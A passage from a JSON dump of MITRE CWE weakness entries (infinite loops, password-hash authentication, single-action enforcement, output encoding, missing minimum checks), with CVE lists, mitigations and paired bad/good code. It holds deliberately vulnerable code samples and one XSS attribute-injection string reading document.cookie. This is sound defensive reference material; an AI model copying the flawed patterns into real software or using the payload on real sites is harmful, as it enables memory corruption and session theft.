rateSold;\n\t\t\t\t\tdays++;\n\t\t\t}\n```\n// if number of days within reorder timeframe* \n\t\t\t\n\t\t\t\n\t\t\t *// set reorder return boolean to true* \n\t\t\tif (days > 0 && days < 5) {\n\t\t\t```\n\t\t\t\tisReorder = true;\n\t\t\t}\n\t\t\treturn isReorder;\n\t}\n```"}, {"BodyText": "However, the while loop will become an infinite loop if the rateSold input parameter has a value of zero since the inventoryCount will never fall below the minimumCount. In this case the input parameter should be validated to ensure that a value of zero does not cause an infinite loop, as in the following code."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic boolean isReorderNeeded(String bookISBN, int rateSold) {\n\t\t\t...\n```\n// validate rateSold variable* \n\t\t\tif (rateSold < 1) {\n\t\t\t```\n\t\t\t\treturn isReorder;\n\t\t\t}\n\t\t\t...\n\t}\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2022-22224", "Description": "Chain: an operating system does not properly process malformed Open Shortest Path First (OSPF) Type/Length/Value Identifiers (TLV) (CWE-703), which can cause the process to enter an infinite loop (CWE-835)", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-22224"}, {"Reference": "CVE-2022-25304", "Description": "A Python machine communication platform did not account for receiving a malformed packet with a null size, causing the receiving function to never update the message buffer and be caught in an infinite loop.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-25304"}, {"Reference": "CVE-2011-1027", "Description": "Chain: off-by-one error (CWE-193) leads to infinite loop (CWE-835) using invalid hex-encoded characters.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1027"}, {"Reference": "CVE-2011-1142", "Description": "Chain: self-referential values in recursive definitions lead to infinite loop.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1142"}, {"Reference": "CVE-2011-1002", "Description": "NULL UDP packet is never cleared from a queue, leading to infinite loop.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1002"}, {"Reference": "CVE-2006-6499", "Description": "Chain: web browser crashes due to infinite loop - \"bad looping logic [that relies on] floating point math [CWE-1339] to exit the loop [CWE-835]\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6499"}, {"Reference": "CVE-2010-4476", "Description": "Floating point conversion routine cycles back and forth between two different values.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4476"}, {"Reference": "CVE-2010-4645", "Description": "Floating point conversion routine cycles back and forth between two different values.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4645"}, {"Reference": "CVE-2010-2534", "Description": "Chain: improperly clearing a pointer in a linked list leads to infinite loop.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2534"}, {"Reference": "CVE-2013-1591", "Description": "Chain: an integer overflow (CWE-190) in the image size calculation causes an infinite loop (CWE-835) which sequentially allocates buffers without limits (CWE-1325) until the stack is full.", "Link": "https://www.cve.org/CVERecord?id=CVE-2013-1591"}, {"Reference": "CVE-2008-3688", "Description": "Chain: A denial of service may be caused by an uninitialized variable (CWE-457) allowing an infinite loop (CWE-835) resulting from a connection to an unresponsive server.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3688"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-23523", "Description": "In versions prior to 0.8.1, the linux-loader crate uses the offsets and sizes provided in the ELF headers to determine the offsets to read from. If those offsets point beyond the end of the file this could lead to Virtual Machine Monitors using the `linux-loader` crate entering an infinite loop if the ELF header of the kernel they are loading was modified in a malicious manner. This issue has been addressed in 0.8.1. The issue can be mitigated by ensuring that only trusted kernel images are loaded or by verifying that the headers do not point beyond the end of the file."}, {"Reference": "CVE-2022-23608", "Description": "PJSIP is a free and open source multimedia communication library written in C language implementing standard based protocols such as SIP, SDP, RTP, STUN, TURN, and ICE. In versions up to and including 2.11.1 when in a dialog set (or forking) scenario, a hash key shared by multiple UAC dialogs can potentially be prematurely freed when one of the dialogs is destroyed . The issue may cause a dialog set to be registered in the hash table multiple times (with different hash keys) leading to undefined behavior such as dialog list collision which eventually leading to endless loop. A patch is available in commit db3235953baa56d2fb0e276ca510fefca751643f which will be included in the next release. There are no known workarounds for this issue."}, {"Reference": "CVE-2022-24191", "Description": "In HTMLDOC 1.9.14, an infinite loop in the gif_read_lzw function can lead to a pointer arbitrarily pointing to heap memory and resulting in a buffer overflow."}, {"Reference": "CVE-2021-46828", "Description": "In libtirpc before 1.3.3rc1, remote attackers could exhaust the file descriptors of a process that uses libtirpc because idle TCP connections are mishandled. This can, in turn, lead to an svc_run infinite loop without accepting new connections."}, {"Reference": "CVE-2022-22224", "Description": "An Improper Check or Handling of Exceptional Conditions vulnerability in the processing of a malformed OSPF TLV in Juniper Networks Junos OS and Junos OS Evolved allows an unauthenticated adjacent attacker to cause the periodic packet management daemon (PPMD) process to go into an infinite loop, which in turn can cause protocols and functions reliant on PPMD such as OSPF neighbor reachability to be impacted, resulting in a sustained Denial of Service (DoS) condition. The DoS condition persists until the PPMD process is manually restarted. This issue affects: Juniper Networks Junos OS: All versions prior to 19.1R3-S9; 19.2 versions prior to 19.2R3-S5; 19.3 versions prior to 19.3R3-S3; 19.4 versions prior to 19.4R3-S9; 20.1 versions prior to 20.1R3; 20.2 versions prior to 20.2R3-S1; 20.3 versions prior to 20.3R3; 20.4 versions prior to 20.4R3; 21.1 versions prior to 21.1R2. Juniper Networks Junos OS Evolved: All versions prior to 20.4R3-S3-EVO; 21.1 versions prior to 21.1R2-EVO."}, {"Reference": "CVE-2022-23437", "Description": "There's a vulnerability within the Apache Xerces Java (XercesJ) XML parser when handling specially crafted XML document payloads. This causes, the XercesJ XML parser to wait in an infinite loop, which may sometimes consume system resources for prolonged duration. This vulnerability is present within XercesJ version 2.12.1 and the previous versions."}, {"Reference": "CVE-2022-23641", "Description": "Discourse is an open source discussion platform. In versions prior to 2.8.1 in the `stable` branch, 2.9.0.beta2 in the `beta` branch, and 2.9.0.beta2 in the `tests-passed` branch, users can trigger a Denial of Service attack by posting a streaming URL. Parsing Oneboxes in the background job trigger an infinite loop, which cause memory leaks. This issue is patched in version 2.8.1 of the `stable` branch, 2.9.0.beta2 of the `beta` branch, and 2.9.0.beta2 of the `tests-passed` branch. As a workaround, disable onebox in admin panel completely or specify allow list of domains that will be oneboxed."}, {"Reference": "CVE-2022-31628", "Description": "In PHP versions before 7.4.31, 8.0.24 and 8.1.11, the phar uncompressor code would recursively uncompress \"quines\" gzip files, resulting in an infinite loop."}, {"Reference": "CVE-2022-46770", "Description": "qubes-mirage-firewall (aka Mirage firewall for QubesOS) 0.8.x through 0.8.3 allows guest OS users to cause a denial of service (CPU consumption and loss of forwarding) via a crafted multicast UDP packet (IP address range of 224.0.0.0 through 239.255.255.255)."}]}
{"ID": "836", "Name": "Use of Password Hash Instead of Password for Authentication", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product records password hashes in a data store, receives a hash of a password from a client, and compares the supplied hash to the hash obtained from the data store.", "ExtendedDescription": "\n\nSome authentication mechanisms rely on the client to generate the hash for a password, possibly to reduce load on the server or avoid sending the password across the network. However, when the client is used to generate the hash, an attacker can bypass the authentication by obtaining a copy of the hash, e.g. by using SQL injection to compromise a database of authentication credentials, or by exploiting an information exposure. The attacker could then use a modified client to replay the stolen hash without having knowledge of the original password.\n\n\nAs a result, the server-side comparison against a client-side hash does not provide any more security than the use of passwords without hashing.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1390", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "PeerOf", "CweID": "602", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism", "Gain Privileges or Assume Identity"], "Note": "An attacker could bypass the authentication routine without knowing the original password."}], "ObservedExamples": [{"Reference": "CVE-2009-1283", "Description": "Product performs authentication with user-supplied password hashes that can be obtained from a separate SQL injection vulnerability (CVE-2009-1282).", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1283"}, {"Reference": "CVE-2005-3435", "Description": "Product allows attackers to bypass authentication by obtaining the password hash for another user and specifying the hash in the pwd argument.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3435"}], "RelatedAttackPatterns": ["644", "652"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-36460", "Description": "VeryFitPro (com.veryfit2hr.second) 3.2.8 hashes the account's password locally on the device and uses the hash to authenticate in all communication with the backend API, including login, registration and changing of passwords. This allows an attacker in possession of a hash to takeover a user's account, rendering the benefits of storing hashed passwords in the database useless."}, {"Reference": "CVE-2021-45036", "Description": " Velneo vClient on its 28.1.3 version, could allow an attacker with knowledge of the victims's username and hashed password to spoof the victim's id against the server. "}, {"Reference": "CVE-2022-25155", "Description": "Use of Password Hash Instead of Password for Authentication vulnerability in Mitsubishi Electric MELSEC iQ-F series FX5U(C) CPU all versions, Mitsubishi Electric MELSEC iQ-F series FX5UJ CPU all versions, Mitsubishi Electric MELSEC iQ-R series R00/01/02CPU all versions, Mitsubishi Electric MELSEC iQ-R series R04/08/16/32/120(EN)CPU all versions, Mitsubishi Electric MELSEC iQ-R series R08/16/32/120SFCPU all versions, Mitsubishi Electric MELSEC iQ-R series R08/16/32/120PCPU all versions, Mitsubishi Electric MELSEC iQ-R series R08/16/32/120PSFCPU all versions, Mitsubishi Electric MELSEC iQ-R series RJ71GN11-T2 all versions, Mitsubishi Electric MELSEC iQ-R series RJ71GN11-EIP all versions, Mitsubishi Electric MELSEC iQ-R series RJ71C24(-R2/R4) all versions, Mitsubishi Electric MELSEC iQ-R series RJ71EN71 all versions, Mitsubishi Electric MELSEC iQ-R series RJ72GF15-T2 all versions, Mitsubishi Electric MELSEC Q series Q03UDECPU all versions, Mitsubishi Electric MELSEC Q series Q04/06/10/13/20/26/50/100UDEHCPU all versions, Mitsubishi Electric MELSEC Q series Q03/04/06/13/26UDVCPU all versions, Mitsubishi Electric MELSEC Q series Q04/06/13/26UDPVCPU all versions, Mitsubishi Electric MELSEC Q series QJ71C24N(-R2/R4) all versions, Mitsubishi Electric MELSEC Q series QJ71E71-100 all versions, Mitsubishi Electric MELSEC Q series QJ72BR15 all versions, Mitsubishi Electric MELSEC Q series QJ72LP25(-25/G/GE) all versions, Mitsubishi Electric MELSEC L series L02/06/26CPU(-P) all versions, Mitsubishi Electric MELSEC L series L26CPU-(P)BT all versions, Mitsubishi Electric MELSEC L series LJ71C24(-R2) all versions, Mitsubishi Electric MELSEC L series LJ71E71-100 all versions and Mitsubishi Electric MELSEC L series LJ72GF15-T2 all versions allows a remote unauthenticated attacker to login to the product by replaying an eavesdropped password hash."}, {"Reference": "CVE-2022-25157", "Description": "Use of Password Hash Instead of Password for Authentication vulnerability in Mitsubishi Electric MELSEC iQ-F series FX5U(C) CPU all versions, Mitsubishi Electric MELSEC iQ-F series FX5UJ CPU all versions, Mitsubishi Electric MELSEC iQ-R series R00/01/02CPU all versions, Mitsubishi Electric MELSEC iQ-R series R04/08/16/32/120(EN)CPU all versions, Mitsubishi Electric MELSEC iQ-R series R08/16/32/120SFCPU all versions, Mitsubishi Electric MELSEC iQ-R series R08/16/32/120PCPU all versions, Mitsubishi Electric MELSEC iQ-R series R08/16/32/120PSFCPU all versions, Mitsubishi Electric MELSEC iQ-R series R16/32/64MTCPU all versions, Mitsubishi Electric MELSEC iQ-R series RJ71C24(-R2/R4) all versions, Mitsubishi Electric MELSEC iQ-R series RJ71EN71 all versions, Mitsubishi Electric MELSEC iQ-R series RJ71GF11-T2 all versions, Mitsubishi Electric MELSEC iQ-R series RJ71GP21(S)-SX all versions, Mitsubishi Electric MELSEC iQ-R series RJ72GF15-T2 all versions, Mitsubishi Electric MELSEC Q series Q03UDECPU all versions, Mitsubishi Electric MELSEC Q series Q04/06/10/13/20/26/50/100UDEHCPU all versions, Mitsubishi Electric MELSEC Q series Q03/04/06/13/26UDVCPU all versions, Mitsubishi Electric MELSEC Q series Q04/06/13/26UDPVCPU all versions, Mitsubishi Electric MELSEC Q series QJ71C24N(-R2/R4) all versions, Mitsubishi Electric MELSEC Q series QJ71E71-100 all versions, Mitsubishi Electric MELSEC L series L02/06/26CPU(-P) all versions, Mitsubishi Electric MELSEC L series L26CPU-(P)BT all versions, Mitsubishi Electric MELSEC L series LJ71C24(-R2) all versions, Mitsubishi Electric MELSEC L series LJ71E71-100 all versions and Mitsubishi Electric MELSEC L series LJ72GF15-T2 all versions allows a remote unauthenticated attacker to disclose or tamper with the information in the product by using an eavesdropped password hash."}, {"Reference": "CVE-2022-32282", "Description": "An improper password check exists in the login functionality of WWBN AVideo 11.6 and dev master commit 3f7c0364. An attacker that owns a users' password hash will be able to use it to directly login into the account, leading to increased privileges."}, {"Reference": "CVE-2021-21469", "Description": "When security guidelines for SAP NetWeaver Master Data Management running on windows have not been thoroughly reviewed, it might be possible for an external operator to try and set custom paths in the MDS server configuration. When no adequate protection has been enforced on any level (e.g., MDS Server password not set, network and OS configuration not properly secured, etc.), a malicious user might define UNC paths which could then be exploited to put the system at risk using a so-called SMB relay attack and obtain highly sensitive data, which leads to Information Disclosure."}]}
{"ID": "837", "Name": "Improper Enforcement of a Single, Unique Action", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product requires that an actor should only be able to perform an action once, or to have only one unique action, but the product does not enforce or improperly enforces this restriction.", "ExtendedDescription": "In various applications, a user is only expected to perform a certain action once, such as voting, requesting a refund, or making a purchase. When this restriction is not enforced, sometimes this can have security implications. For example, in a voting application, an attacker could attempt to \"stuff the ballot box\" by voting multiple times. If these votes are counted separately, then the attacker could directly affect who wins the vote. This could have significant business impact depending on the purpose of the product.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "799", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Varies by Context"], "Note": "An attacker might be able to gain advantage over other users by performing the action multiple times, or affect the correctness of the product."}], "ObservedExamples": [{"Reference": "CVE-2008-0294", "Description": "Ticket-booking web application allows a user to lock a seat more than once.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0294"}, {"Reference": "CVE-2005-4051", "Description": "CMS allows people to rate downloads by voting more than once.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-4051"}, {"Reference": "CVE-2002-216", "Description": "Polling software allows people to vote more than once by setting a cookie.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-216"}, {"Reference": "CVE-2003-1433", "Description": "Chain: lack of validation of a challenge key in a game allows a player to register multiple times and lock other players out of the game.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1433"}, {"Reference": "CVE-2002-1018", "Description": "Library feature allows attackers to check out the same e-book multiple times, preventing other users from accessing copies of the e-book.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1018"}, {"Reference": "CVE-2009-2346", "Description": "Protocol implementation allows remote attackers to cause a denial of service (call-number exhaustion) by initiating many message exchanges.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2346"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "838", "Name": "Inappropriate Encoding for Output Context", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses or specifies an encoding when generating output to a downstream component, but the specified encoding is not the same as the encoding that is expected by the downstream component.", "ExtendedDescription": "\n\nThis weakness can cause the downstream component to use a decoding method that produces different data than what the product intended to send. When the wrong encoding is used - even if closely related - the downstream component could decode the data incorrectly. This can have security consequences when the provided boundaries between control and data are inadvertently broken, because the resulting data could introduce control characters or special elements that were not sent by the product. The resulting data could then be used to bypass protection mechanisms such as input validation, and enable injection attacks.\n\n\nWhile using output encoding is essential for ensuring that communications between components are accurate, the use of the wrong encoding - even if closely related - could cause the downstream component to misinterpret the output.\n\n\nFor example, HTML entity encoding is used for elements in the HTML body of a web page. However, a programmer might use entity encoding when generating output for that is used within an attribute of an HTML tag, which could contain functional Javascript that is not affected by the HTML encoding.\n\n\nWhile web applications have received the most attention for this problem, this weakness could potentially apply to any type of product that uses a communications stream that could support multiple encodings.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "116", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "116", "ViewID": "1003", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["Modify Application Data", "Execute Unauthorized Code or Commands"], "Note": "An attacker could modify the structure of the message or data being sent to the downstream component, possibly injecting commands."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Strategy": "Output Encoding", "Description": "Use context-aware encoding. That is, understand which encoding is being used by the downstream component, and ensure that this encoding is used. If an encoding can be specified, do so, instead of assuming that the default encoding is the same as the default being assumed by the downstream component."}, {"Phase": ["Architecture and Design"], "Strategy": "Output Encoding", "Description": "Where possible, use communications protocols or data formats that provide strict boundaries between control and data. If this is not feasible, ensure that the protocols or formats allow the communicating components to explicitly state which encoding/decoding method is being used. Some template frameworks provide built-in support."}, {"MitigationID": "MIT-4.3", "Phase": ["Architecture and Design"], "Strategy": "Libraries or Frameworks", "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.\n\n\nNote that some template mechanisms provide built-in support for the appropriate encoding.\n"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "This code dynamically builds an HTML page using POST data:"}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t$username = $_POST['username'];\n\t$picSource = $_POST['picsource'];\n\t$picAltText = $_POST['picalttext'];\n```\n...* \n\t\n\techo \"<title>Welcome, \" . htmlentities($username) .\"</title>\";\n\techo \"<img src='\". htmlentities($picSource) .\" ' alt='\". htmlentities($picAltText) . '\" />';\n\t\n\t *...*"}, {"BodyText": "The programmer attempts to avoid XSS exploits (CWE-79) by encoding the POST values so they will not be interpreted as valid HTML. However, the htmlentities() encoding is not appropriate when the data are used as HTML attributes, allowing more attributes to be injected."}, {"BodyText": "For example, an attacker can set picAltText to:"}, {"Nature": "Attack", "ExampleCode": "```\n\t\"altTextHere' onload='alert(document.cookie)\"\n```"}, {"BodyText": "This will result in the generated HTML image tag:"}, {"Nature": "Result", "Language": "HTML", "ExampleCode": "```\n\t<img src='pic.jpg' alt='altTextHere' onload='alert(document.cookie)' />\n```"}, {"BodyText": "The attacker can inject arbitrary javascript into the tag due to this incorrect encoding."}]}], "ObservedExamples": [{"Reference": "CVE-2009-2814", "Description": "Server does not properly handle requests that do not contain UTF-8 data; browser assumes UTF-8, allowing XSS.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2814"}], "RelatedAttackPatterns": ["468"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-43408", "Description": "Jenkins Pipeline: Stage View Plugin 2.26 and earlier does not correctly encode the ID of 'input' steps when using it to generate URLs to proceed or abort Pipeline builds, allowing attackers able to configure Pipelines to specify 'input' step IDs resulting in URLs that would bypass the CSRF protection of any target URL in Jenkins."}, {"Reference": "CVE-2022-43407", "Description": "Jenkins Pipeline: Input Step Plugin 451.vf1a_a_4f405289 and earlier does not restrict or sanitize the optionally specified ID of the 'input' step, which is used for the URLs that process user interactions for the given 'input' step (proceed or abort) and is not correctly encoded, allowing attackers able to configure Pipelines to have Jenkins build URLs from 'input' step IDs that would bypass the CSRF protection of any target URL in Jenkins when the 'input' step is interacted with."}]}
{"ID": "839", "Name": "Numeric Range Comparison Without Minimum Check", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product checks a value to ensure that it is less than or equal to a maximum, but it does not also verify that the value is greater than or equal to the minimum.", "ExtendedDescription": "\n\nSome products use signed integers or floats even when their values are only expected to be positive or 0. An input validation check might assume that the value is positive, and only check for the maximum value. If the value is negative, but the code assumes that the value is positive, this can produce an error. The error may have security consequences if the negative value is used for memory allocation, array access, buffer access, etc. Ultimately, the error could lead to a buffer overflow or other type of memory corruption.\n\n\nThe use of a negative number in a positive-only context could have security implications for other types of resources. For example, a shopping cart might check that the user is not requesting more than 10 items, but a request for -3 items could cause the application to calculate a negative price and credit the attacker's account.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1023", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "195", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "682", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "119", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "124", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Often"}, {"Type": "Language", "Name": "C++", "Prevalence": "Often"}], "AlternateTerms": [{"Term": "Signed comparison", "Description": "The \"signed comparison\" term is often used to describe when the product uses a signed variable and checks it to ensure that it is less than a maximum value (typically a maximum buffer size), but does not verify that it is greater than 0."}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["Modify Application Data", "Execute Unauthorized Code or Commands"], "Note": "An attacker could modify the structure of the message or data being sent to the downstream component, possibly injecting commands."}, {"Scope": ["Availability"], "Impact": ["DoS: Resource Consumption (Other)"], "Note": "in some contexts, a negative value could lead to resource consumption."}, {"Scope": ["Confidentiality", "Integrity"], "Impact": ["Modify Memory", "Read Memory"], "Note": "If a negative value is used to access memory, buffers, or other indexable structures, it could access memory outside the bounds of the buffer."}], "PotentialMitigations": [{"Phase": ["Implementation"], "Strategy": "Enforcement by Conversion", "Description": "If the number to be used is always expected to be positive, change the variable type from signed to unsigned or size_t."}, {"Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "If the number to be used could have a negative value based on the specification (thus requiring a signed value), but the number should only be positive to preserve code correctness, then include a check to ensure that the value is positive."}], "DemonstrativeExamples": [{"ID": "DX-21", "Entries": [{"IntroText": "The following code is intended to read an incoming packet from a socket and extract one or more headers."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tDataPacket *packet;\n\tint numHeaders;\n\tPacketHeader *headers;\n\tsock=AcceptSocketConnection();\n\tReadPacket(packet, sock);\n\tnumHeaders =packet->headers;\n\tif (numHeaders > 100) {\n\t\tExitError(\"too many headers!\");\n\t}\n\theaders = malloc(numHeaders * sizeof(PacketHeader);\n\tParsePacketHeaders(packet, headers);\n```"}, {"BodyText": "The code performs a check to make sure that the packet does not contain too many headers. However, numHeaders is defined as a signed int, so it could be negative. If the incoming packet specifies a value such as -3, then the malloc calculation will generate a negative number (say, -300 if each header can be a maximum of 100 bytes). When this result is provided to malloc(), it is first converted to a size_t type. This conversion then produces a large value such as 4294966996, which may cause malloc() to fail or to allocate an extremely large amount of memory (CWE-195). With the appropriate negative numbers, an attacker could trick malloc() into using a very small positive number, which then allocates a buffer that is much smaller than expected, potentially leading to a buffer overflow."}]}, {"ID": "DX-23", "Entries": [{"IntroText": "The following code reads a maximum size and performs a sanity check on that size. It then performs a strncpy, assuming it will not exceed the boundaries of the array. While the use of \"short s\" is forced in this particular example, short int's are frequently used within real-world code, such as code that processes structured data."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tint GetUntrustedInt () {\n\t\treturn(0x0000FFFF);\n\t}\n\tvoid main (int argc, char **argv) {\n\t\t\tchar path[256];\n\t\t\tchar *input;\n\t\t\tint i;\n\t\t\tshort s;\n\t\t\tunsigned int sz;\n\t\t\ti = GetUntrustedInt();\n\t\t\ts = i;\n\t\t\t/* s is -1 so it passes the safety check - CWE-697 */\n\t\t\tif (s > 256) {\n\t\t\t\tDiePainfully(\"go away!\\n\");\n\t\t\t}\n\t\t\t/* s is sign-extended and saved in sz */\n\t\t\tsz = s;\n\t\t\t/* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */\n\t\t\tprintf(\"i=%d, s=%d, sz=%u\\n\", i, s, sz);\n\t\t\tinput = GetUserInput(\"Enter pathname:\");\n\t\t\t/* strncpy interprets s as unsigned int, so it's treated as MAX_INT\n\t\t\t(CWE-195), enabling buffer overflow (CWE-119) */\n\t\t\tstrncpy(path, input, s);\n\t\t\tpath[255] = '\\0'; /* don't want CWE-170 */\n\t\t\tprintf(\"Path is: %s\\n\", path);\n\t}\n```"}, {"BodyText": "This code first exhibits an example of CWE-839, allowing \"s\" to be a negative number. When the negative short \"s\" is converted to an unsigned integer, it becomes an extremely large positive integer. When this converted integer is used by strncpy() it will lead to a buffer overflow (CWE-119)."}]}, {"ID": "DX-100", "Entries": [{"IntroText": "In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method"}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tint getValueFromArray(int *array, int len, int index) {\n\t\t\tint value;\n```\n// check that the array index is less than the maximum* \n\t\t\t\n\t\t\t\n\t\t\t *// length of the array* \n\t\t\tif (index < len) {\n\t\t\t```\n```\n// get the value at the specified index of the array* \n\t\t\t\t\tvalue = array[index];}\n\t\t\t\n\t\t\t *// if array index is invalid then output error message* \n\t\t\t\n\t\t\t\n\t\t\t *// and return value indicating error* \n\t\t\telse {\n\t\t\t```\n\t\t\t\tprintf(\"Value is: %d\\n\", array[index]);\n\t\t\t\tvalue = -1;\n\t\t\t}\n\t\t\treturn value;\n\t}\n```"}, {"BodyText": "However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below."}, {"Nature": "Good", "Language": "C", "ExampleCode": "```\n\t...\n```\n// check that the array index is within the correct* \n\t\n\t\n\t *// range of values for the array* \n\tif (index >= 0 && index < len) {\n\t\n\t..."}]}, {"Entries": [{"IntroText": "The following code shows a simple BankAccount class with deposit and withdraw methods."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class BankAccount {\n\t\t\tpublic final int MAXIMUM_WITHDRAWAL_LIMIT = 350;\n```\n// variable for bank account balance* \n\t\t\tprivate double accountBalance;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor for BankAccount* \n\t\t\tpublic BankAccount() {\n\t\t\t```\n\t\t\t\taccountBalance = 0;\n\t\t\t}\n```\n// method to deposit amount into BankAccount* \n\t\t\tpublic void deposit(double depositAmount) {...}\n\t\t\t\n\t\t\t\n\t\t\t *// method to withdraw amount from BankAccount* \n\t\t\tpublic void withdraw(double withdrawAmount) {\n\t\t\t```\n\t\t\t\t\tif (withdrawAmount < MAXIMUM_WITHDRAWAL_LIMIT) {\n\t\t\t\t\t\t\tdouble newBalance = accountBalance - withdrawAmount;\n\t\t\t\t\t\t\taccountBalance = newBalance;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tSystem.err.println(\"Withdrawal amount exceeds the maximum limit allowed, please try again...\");\n\t\t\t\t\t\t...\n\t\t\t\t\t}\n\t\t\t}\n```\n// other methods for accessing the BankAccount object* \n\t\t\t...}"}, {"BodyText": "The withdraw method includes a check to ensure that the withdrawal amount does not exceed the maximum limit allowed, however the method does not check to ensure that the withdrawal amount is greater than a minimum value (CWE-129). Performing a range check on a value that does not include a minimum check can have significant security implications, in this case not including a minimum range check can allow a negative value to be used which would cause the financial application using this class to deposit money into the user account rather than withdrawing. In this example the if statement should the modified to include a minimum range check, as shown below."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class BankAccount {\n\t\t\tpublic final int MINIMUM_WITHDRAWAL_LIMIT = 0;\n\t\t\tpublic final int MAXIMUM_WITHDRAWAL_LIMIT = 350;\n\t\t\t...\n```\n// method to withdraw amount from BankAccount* \n\t\t\tpublic void 